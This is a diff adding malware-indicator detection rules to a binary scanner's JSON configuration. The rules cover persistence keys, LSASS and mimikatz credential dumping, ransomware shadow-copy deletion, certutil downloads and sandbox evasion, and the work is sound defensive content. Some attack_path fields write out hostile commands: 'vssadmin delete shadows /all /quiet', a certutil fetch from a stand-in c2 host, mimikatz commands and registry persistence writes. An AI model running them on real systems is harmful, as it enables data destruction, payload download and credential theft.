+      "tags": ["mshta", "wscript", "lolbin", "hta"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:mshta|wscript|cscript)(?:\\.exe)?"
+      }
+    },
+
+    {
+      "id": "exe-string-registry-run-key",
+      "title": "Registry Run Key Path (Persistence String)",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains a Windows registry Run key path (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run or HKLM equivalent). Writing to these keys causes the executable to run at every user login or system boot.",
+      "attack_path": "RegSetValueExA(HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, NULL, 'malware', REG_SZ, 'C:\\Users\\victim\\AppData\\Local\\Temp\\svchost32.exe') installs boot persistence.",
+      "remediation": "Combine with RegSetValueEx import detection. Monitor Run key writes via Sysmon Event ID 13. Audit startup entries regularly.",
+      "cwe": ["CWE-284"],
+      "references": ["https://attack.mitre.org/techniques/T1547/001/"],
+      "tags": ["persistence", "registry", "run-key", "autostart"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:HKEY_CURRENT_USER|HKCU|HKEY_LOCAL_MACHINE|HKLM)\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run(?:Once)?"
+      }
+    },
+
+    {
+      "id": "exe-string-lsass",
+      "title": "LSASS Process Target String",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The string 'lsass.exe' or 'lsass' appears in the binary. LSASS (Local Security Authority Subsystem Service) stores credentials in memory. References to lsass.exe in non-system binaries strongly indicate credential dumping intent.",
+      "attack_path": "The binary likely uses OpenProcess to target lsass.exe by name (via CreateToolhelp32Snapshot + Process32First/Next to find lsass PID), then reads its memory to extract credentials.",
+      "remediation": "This is a critical finding — investigate immediately. Enable LSA Protection (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL=1). Enable Credential Guard.",
+      "cwe": ["CWE-522"],
+      "references": ["https://attack.mitre.org/techniques/T1003/001/"],
+      "tags": ["lsass", "credential-dump", "mimikatz-pattern"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)lsass(?:\\.exe)?"
+      }
+    },
+
+    {
+      "id": "exe-string-shadow-copy-delete",
+      "title": "Shadow Copy Deletion Commands (Ransomware / Wiper)",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains strings matching vssadmin, wmic shadowcopy delete, or bcdedit commands used to delete Volume Shadow Copies (VSS) or disable Windows recovery. This is the ransomware/wiper pre-encryption step that prevents file restoration.",
+      "attack_path": "vssadmin delete shadows /all /quiet or wmic shadowcopy delete removes all Windows backup restore points before encryption begins, ensuring victims cannot restore files without paying ransom.",
+      "remediation": "These commands have no legitimate business purpose in application code. Alert immediately. Block vssadmin.exe and wmic with /shadowcopy arguments via AppLocker.",
+      "cwe": ["CWE-311"],
+      "references": ["https://attack.mitre.org/techniques/T1490/"],
+      "tags": ["ransomware", "shadow-copy", "wiper", "vssadmin", "mitre-t1490"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:vssadmin|wmic|wbadmin).*(?:shadow|backup|delete|shadows)|bcdedit.*(?:recoveryenabled|bootstatuspolicy)"
+      }
+    },
+
+    {
+      "id": "exe-string-ransom-note",
+      "title": "Ransomware Note / Encryption Keywords",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains strings typical of ransomware notes: encryption notifications, Bitcoin payment demands, .onion addresses, or decryption key references.",
+      "attack_path": "Ransomware drops an HTML/TXT ransom note after encryption. The presence of these strings in the binary strongly indicates ransomware functionality.",
+      "remediation": "Treat as confirmed malware. Isolate the system immediately. Do not pay ransom without consulting law enforcement. Restore from clean offline backups.",
+      "cwe": ["CWE-311"],
+      "references": ["https://attack.mitre.org/techniques/T1486/"],
+      "tags": ["ransomware", "ransom-note", "bitcoin", "encryption"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:your files (?:have been|are) encrypted|all your files|decrypt.*files|files are locked|send.*bitcoin|btc.*wallet|\\.onion|decryption key|restore your files|ransom)"
+      }
+    },
+
+    {
+      "id": "exe-string-mimikatz",
+      "title": "Mimikatz / Credential Tool Strings",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains string signatures from mimikatz or other well-known credential dumping tools (sekurlsa::logonpasswords, lsadump::sam, privilege::debug, WCE). These strings appear verbatim in tools designed for offensive use.",
+      "attack_path": "Mimikatz extracts plaintext credentials from LSASS memory using sekurlsa::logonpasswords, dumps SAM hashes with lsadump::sam, and enables debug privileges with privilege::debug.",
+      "remediation": "This is a high-confidence malware/offensive tool indicator. Investigate the binary's origin and purpose immediately. Enable PPL for LSASS and Credential Guard to defend against mimikatz.",
+      "cwe": ["CWE-522"],
+      "references": ["https://github.com/gentilkiwi/mimikatz"],
+      "tags": ["mimikatz", "credential-dump", "lsadump", "sekurlsa"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:sekurlsa::|lsadump::|privilege::debug|mimikatz|WCE v\\d|gsecdump|fgdump)"
+      }
+    },
+
+    {
+      "id": "exe-string-hardcoded-ip",
+      "title": "Hardcoded Public IP Address (Potential C2)",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains hardcoded public IP addresses. Hardcoded IPs in malware are used for Command and Control (C2) communication — the malware connects to a fixed IP to receive instructions or exfiltrate data.",
+      "attack_path": "The binary makes a direct connection to the hardcoded IP for C2 beaconing, data exfiltration, or downloading a second-stage payload — bypassing DNS-based filtering.",
+      "remediation": "Investigate the IP address reputation (VirusTotal, Shodan, AbuseIPDB). Block the IP at the firewall. For legitimate software, ensure hardcoded IPs are only for well-known services.",
+      "cwe": ["CWE-200"],
+      "references": [],
+      "tags": ["c2", "hardcoded-ip", "ioc", "network"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "\\b(?!(?:10|127|172\\.(?:1[6-9]|2\\d|3[01])|192\\.168)\\.)(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b"
+      }
+    },
+
+    {
+      "id": "exe-string-hardcoded-password",
+      "title": "Hardcoded Password / Secret in Strings",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains hardcoded password or secret strings. Hardcoded credentials can be extracted by decompiling or string-scanning the binary.",
+      "attack_path": "Attacker extracts the password string with strings.exe or a decompiler. Uses the credential to authenticate to databases, APIs, or admin panels — often with elevated access.",
+      "remediation": "Externalize all credentials to configuration files, environment variables, or a secrets manager. Never hardcode passwords or API keys in compiled binaries.",
+      "cwe": ["CWE-259"],
+      "references": [],
+      "tags": ["hardcoded-credentials", "password", "secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:password|passwd|pwd|secret|api_key|apikey)\\s*[=:]\\s*[^\\s\"']{6,}"
+      }
+    },
+
+    {
+      "id": "exe-string-aws-key",
+      "title": "Hardcoded AWS Access Key",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "An AWS Access Key ID (AKIA...) is hardcoded in the binary. Anyone who can run strings on the binary can extract this key and gain access to AWS resources.",
+      "attack_path": "Attacker uses strings.exe, extracts AKIA key, authenticates to AWS CLI. Depending on attached IAM policies: reads S3 data, launches EC2 instances, accesses RDS databases, or escalates to full account takeover.",
+      "remediation": "Revoke the leaked key immediately in AWS IAM console. Use IAM instance roles, AWS Secrets Manager, or environment variables. Rotate all potentially exposed keys.",
+      "cwe": ["CWE-798"],
+      "references": [],
+      "tags": ["aws", "access-key", "cloud-credentials", "hardcoded-secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "AKIA[0-9A-Z]{16}"
+      }
+    },
+
+    {
+      "id": "exe-string-sandbox-detection",
+      "title": "Sandbox / VM Detection Strings",
+      "severity": "High",
+      "category": "Anti-Analysis",
+      "enabled": true,
+      "description": "The binary contains strings used to detect sandbox or virtual machine environments (VMware, VirtualBox, QEMU, Cuckoo, Sandboxie). This indicates deliberate evasion of automated malware analysis.",
+      "attack_path": "Malware checks for VM artifacts (VMware registry keys, VBox drivers, Sandboxie DLLs) at startup. If detected, it takes a benign code path to fool the sandbox, while executing malicious behavior only on real hardware.",
+      "remediation": "Sandbox detection is a strong malware indicator in non-VM-software. Malware analysts should use bare-metal sandboxes or VM-cloaking tools (VMCloak, VBoxHardenedLoader) to defeat these checks.",
+      "cwe": ["CWE-693"],
+      "references": [],
+      "tags": ["sandbox-evasion", "vm-detection", "vmware", "virtualbox", "cuckoo"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:vmware|virtualbox|vbox|qemu|xen|cuckoo|sandboxie|anubis|cwsandbox|wine_get_unix|HGFS\\b|vmtoolsd|vmmouse)"
+      }
+    },
+
+    {
+      "id": "exe-string-certutil-abuse",
+      "title": "Certutil LOLBin Abuse Pattern",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary references certutil.exe with decode or urlcache flags. Certutil is a Windows LOLBin (Living off the Land Binary) commonly abused to download files and decode Base64 payloads, bypassing application whitelisting.",
+      "attack_path": "certutil.exe -decode encoded_payload.txt malware.exe decodes a Base64-encoded malware payload that was delivered in plain text. certutil.exe -urlcache -split -f http://c2/payload.exe downloads a file using a trusted Windows binary.",
+      "remediation": "Block certutil.exe with -decode and -urlcache flags via AppLocker or WDAC. Monitor certutil.exe executions with network activity via Sysmon.",
+      "cwe": ["CWE-78"],
+      "references": [],
+      "tags": ["certutil", "lolbin", "decode", "download"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)certutil.*(?:-decode|-urlcache|-split)"
+      }
+    },
+
+    {
+      "id": "exe-string-temp-execution",
+      "title": "Execution from Temp / AppData Directory",
+      "severity": "Medium",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary references execution paths in %TEMP%, %APPDATA%, or %LOCALAPPDATA% — user-writable directories not monitored by default. Malware commonly drops payloads here to avoid requiring write access to Program Files or System32.",
+      "attack_path": "Dropper writes payload to %TEMP%\\svchost32.exe or %APPDATA%\\Microsoft\\explorer.exe (a fake system process name). Executes from there to persist or escalate while avoiding detection from path-based rules.",
+      "remediation": "Implement AppLocker rules blocking execution from %TEMP%, %APPDATA%, and other user-writable directories. Monitor process creation from these paths via Sysmon Event ID 1.",
+      "cwe": ["CWE-426"],
+      "references": [],
+      "tags": ["temp-execution", "user-writable", "dropper"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)%(?:temp|tmp|appdata|localappdata)%\\\\[^\\s\"']{4,}(?:\\.exe|\\.dll|\\.bat|\\.ps1|\\.vbs)"
+      }
+    },
+
+    {
+      "id": "exe-string-appinit-dlls",
+      "title": "AppInit_DLLs Persistence Registry Key",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary references AppInit_DLLs, a registry value that causes a specified DLL to be loaded into every process that loads user32.dll. This is a classic DLL injection persistence mechanism used by rootkits.",
+      "attack_path": "Setting HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs=malware.dll with LoadAppInit_DLLs=1 causes malware.dll to be injected into every GUI application, providing broad persistence and evasion.",
+      "remediation": "AppInit_DLLs is disabled by Secure Boot on modern Windows. Monitor for writes to this registry value. Alert on non-empty AppInit_DLLs value.",
+      "cwe": ["CWE-284"],
+      "references": ["https://attack.mitre.org/techniques/T1546/010/"],
+      "tags": ["appinit-dlls", "dll-injection", "persistence", "rootkit", "mitre-t1546"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)AppInit_DLLs"
+      }
+    },
+
+    {
+      "id": "exe-string-large-base64",
+      "title": "Large Base64-Encoded Payload",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "A large Base64-encoded string (likely > 1KB decoded) is present in the binary's strings. This is a common technique to embed obfuscated payloads, shellcode, or scripts that are decoded and executed at runtime.",
+      "attack_path": "Malware stores Base64-encoded shellcode or a PowerShell script in a string constant. At runtime, it decodes with CryptStringToBinary or a manual Base64 decoder and executes the payload, bypassing string-based AV detection.",
+      "remediation": "Extract and decode the Base64 string for analysis. Submit to VirusTotal or a sandbox. Base64 blobs > 1KB in non-cryptographic applications are suspicious.",
+      "cwe": ["CWE-506"],
+      "references": [],
+      "tags": ["base64", "obfuscation", "encoded-payload", "shellcode"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "[A-Za-z0-9+/]{300,}={0,2}"
+      }
+    }
+
+  ]
+}
